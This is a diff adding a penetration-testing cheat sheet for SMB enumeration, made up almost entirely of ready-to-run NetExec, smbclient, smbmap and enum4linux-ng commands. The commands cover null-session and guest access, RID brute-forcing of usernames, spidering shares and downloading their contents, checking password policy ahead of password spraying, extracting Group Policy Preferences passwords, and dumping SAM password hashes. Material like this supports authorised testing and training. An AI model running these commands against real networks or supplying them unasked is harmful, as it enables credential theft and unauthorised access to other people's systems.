@@ -1,0 +1,31 @@
+SMB ENUMERATION — QUICK REF
+
+Requires: reachable SMB host (TCP 445); creds optional for null-session steps
+
+1.  Fingerprint (host / OS / signing):
+    nxc smb <target-or-cidr>
+    # note signing:False (relay-able) and SMBv1
+
+2.  Null / guest (no creds):
+    nxc smb <target> -u '' -p ''
+    nxc smb <target> -u 'guest' -p ''
+    smbclient -L //<target>/ -N
+    nxc smb <target> -u '' -p '' --rid-brute        # user list, no creds
+
+3.  Shares:
+    nxc smb <target> -u <user> -p <pass> --shares
+    smbmap -H <target> -u <user> -p <pass>
+    smbclient //<target>/<share> -U '<user>%<pass>'   # recurse ON; mget *
+    nxc smb <target> -u <user> -p <pass> -M spider_plus
+
+4.  Users / groups / policy:
+    nxc smb <target> -u <user> -p <pass> --users
+    nxc smb <target> -u <user> -p <pass> --groups
+    nxc smb <target> -u <user> -p <pass> --pass-pol       # before spraying!
+    nxc smb <target> -u <user> -p <pass> --loggedon-users
+
+5.  Deeper + quick wins:
+    enum4linux-ng -A <target>
+    nxc smb <target> -u <user> -p <pass> -M gpp_password
+    nxc smb <target> -u <user> -p <pass> --sam            # needs admin
+    nxc smb <target> -u <user> -p <pass>                  # look for (Pwn3d!)
